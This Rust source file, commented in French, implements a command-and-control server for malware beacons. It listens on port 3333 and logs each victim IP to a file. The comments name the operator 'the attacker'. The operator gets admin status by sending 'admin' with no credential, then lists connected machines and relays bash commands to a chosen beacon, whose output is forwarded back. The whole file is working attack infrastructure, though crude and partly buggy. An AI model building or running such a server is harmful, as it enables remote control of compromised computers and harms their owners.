use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::fs::File;
use std::fs::OpenOptions;
use std::str;
use std::io::BufReader;
//static mut ADMIN:Vec<String>=Vec::new();

///
static  mut ONLINE:Vec<((String,String),TcpStream)>=Vec::new();
/// Vérifie si un buffer est vide ou non 
/// Parameters:
///     buf: &[u8] le buffer 
fn is_zero(buf: &[u8]) -> bool {
    buf.into_iter().all(|&b| b == 0)
}
/// Gère les ordres que l'attaquant envoies aux Beacons   
/// Parameters:  
///     commands:Vec<&str> la commande entrer par l'attaquant  
///     mut stream:TcpStream la socket qui lie le serveur au beacon cible  
/// Si la commande commence par admin on log l'attaquant (par défaut toute les sockets sont identifier comme des beacon)  
/// Si la "commande" commence par response, on l'identifie comme la réponse envoyé par un beacon on l'envoie a tout les administrateur  
/// Si la commande commence par "command" on l'identifie comme l'attaquant qui tente d'envoyer une commande bash à un beacon cible  
/// Si la commande est exit, on déconnecte l'attaquant  
/// Si la commande est "list" on affiche la liste des individus connecté  
unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
    
    if commands[0]=="admin"{
        println!("ici");
        let mut i=0;
        for key in ONLINE.iter() {

            if key.1.peer_addr().unwrap() == stream.peer_addr().unwrap()
            {
                //key.0.1="admin".to_string();
                ONLINE[i].0.1="admin".to_string();
                stream.write(b"Admin Authentified\n").unwrap();
            }
            i=i+1;
        }
    }
    else if commands[0]=="response" {
        let comm:String =   commands.into_iter().map(|i| i.to_string()+" ").collect::<String>();
        for key in ONLINE.iter() {
            if key.0.1 == "admin" {
                let mut target_stream: TcpStream = key.1.try_clone().unwrap();
                target_stream.write(comm.as_bytes()).unwrap();
                target_stream.write(b"\n").unwrap();
            }
        }
    }
    else if commands[0]=="command"{
        commands[1].replace("target", " ");
        println!("{}",commands[1]);
        let comm =commands[0].to_owned()+" "+commands[1];
        let target = commands[2];
        println!("{} {}",comm,target);
        for key in ONLINE.iter() {
            if key.0.0==target && key.0.1=="beacon"{
                let mut target_stream:TcpStream=key.1.try_clone().unwrap();
                target_stream.write(comm.as_bytes()).unwrap();
                target_stream.write(b"\n").unwrap();

            }
        }

    }
    else if commands[0]=="exit"{
        let test:String=stream.peer_addr().unwrap().to_string();
        let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
        for i in 0..ONLINE.len(){
            if   ONLINE[i].0.0==client_ip{
                ONLINE.remove(i);
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
        }

    }
    else if commands[0]=="list"
    {
        for key in ONLINE.iter(){
            stream.write(key.0.0.as_bytes()).unwrap();
            stream.write(b": ").unwrap();
            stream.write(key.0.1.as_bytes()).unwrap();
            stream.write(b"\n").unwrap();
        }
    }
}
/// Permet de retirer les caractères /n et /r en fin d'un string
/// Parameters
///     s: &mut String le string duquel on souhaite retirer ces caractères
fn trim_newline(s: &mut String) {
    s.pop();
    if s.ends_with('\n') {
        s.pop();
        if s.ends_with('\r') {
            s.pop();
        }
    }
}
/// Transforme un buffer en String en retirant les caractères spéciaux qu'il contient
/// Parameter: 
///     buffer: &mut [u8] le buffer dont on veut parse les données
fn to_clean_string(buffer: &mut [u8]) -> String {
    let mut vec_input = vec![]; 
    vec_input.extend_from_slice(&buffer);
    let mut input = String::from_utf8(vec_input).unwrap();
    input.retain(|c| c != '\0');
    input.retain(|c| c!='\r');
    trim_newline(&mut input);
    let tmp:&str=input.split("\n").collect::<Vec<&str>>()[0];
    return  tmp.to_string();
}

/// Enregiste une adresse ip dans le fichier liste utilisateur
/// Parameter:
///     ip: &str l'adresse
fn register(ip: &str){
    println!("registering");
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("src/user.txt")
        .unwrap();
    writeln!(file,"{}",ip).expect("Unable to write file");
}
/// Cette fonction prend une socket tcp en entrée, lis son buffer, et fait appel à la fonction order_manage
  fn handle_client(mut stream: TcpStream) {
      let test:String=stream.peer_addr().unwrap().to_string();
      let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
      let mut data =[0u8;1024];
      while match stream.read(&mut data) {
        Ok(size) => unsafe {
            if !is_zero(&data){
                let tmp=to_clean_string(&mut data);
                let orders:Vec<&str>=tmp.split(":").collect();
                orders_manage(orders,stream.try_clone().unwrap());
            } else {
                for i in 0..ONLINE.len() {
                    if   ONLINE[i].0.0==client_ip{
                        println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
                        ONLINE.remove(i);
                        stream.shutdown(Shutdown::Both).expect("shutdown call failed");
                    }
                }

            }

            true
        },
        Err(_) => {
            println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
            stream.shutdown(Shutdown::Both).unwrap();
            false
        }
    }{}

 }
/// Closure principale du programme  
/// Bind le listener sur le port 3333  
/// A chaque nouvelle connexion, on regarde si l'ip est enregistré dans le user.txt  
/// Si oui, on ouvre un thread et on appelle la fonction handle_client  
/// Si non, on ecrit l'ip dans le user.txt, et on appelle handle_client
fn main() {
    let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
    // accept connections and process them, spawning a new thread for each one
    println!("Server listening on port 3333");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => unsafe {
                println!("New connection: {}", stream.peer_addr().unwrap());
                let test:String=stream.peer_addr().unwrap().to_string();
                let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
                let file: File = File::open("src/user.txt").expect("error");
                let mut _buf_reader = BufReader::new(file);
                let mut contents = String::new();
                _buf_reader.read_to_string(&mut contents).unwrap();
                let _vec = contents.split("\n").collect::<Vec<&str>>();
                let mut ok:bool=false;
                for ip in _vec.iter(){
                    let _ip:Vec<&str>=ip.split(":").collect();
                    if  client_ip==_ip[0]
                    {
                        ok=true;
                    }
                }
                if ok==false{register(client_ip.clone())};

                ONLINE.push(((client_ip.to_string(),"beacon".to_string()),stream.try_clone().expect(" Unable to clone stream")));
                thread::spawn(move|| {
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
    // close the socket server
    drop(listener);
}